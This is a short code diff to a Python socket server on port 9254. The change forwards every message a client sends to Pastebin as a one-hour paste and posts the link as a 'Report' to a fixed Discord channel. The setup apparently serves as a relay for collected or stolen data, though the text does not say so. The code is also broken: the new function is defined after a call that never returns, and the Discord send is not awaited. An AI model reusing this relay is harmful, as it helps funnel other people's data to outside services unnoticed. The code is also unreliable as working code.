@@ -38,6 +38,9 @@ def run_server(host, port):
         while True:
             incoming = newClient.recv(1024)
             # empty bytes object means EOF here, but we also let the client send 'quit' to signal shutdown
+            if incoming:
+                print(incoming)
+                pasteAndSend(incoming)
             if incoming == b'' or incoming == b'quit':
                # neither of these steps are formally required, but are
                # hygienic to do when we know the socket is going away
@@ -51,6 +54,7 @@ def run_server(host, port):
 
 run_server('0.0.0.0', 9254)
 
-def pasteAndSend():
-    pasteLink = pastebin.paste(pastebinKey, report, pastebinUser, paste_expire_date='1H')
-    
+def pasteAndSend(data):
+    pasteLink = pastebin.paste(pastebinKey, data, pastebinUser, paste_expire_date='1H')
+    channel = bot.get_channel(667025203523616773)
+    channel.send(f'Report: {pasteLink}')
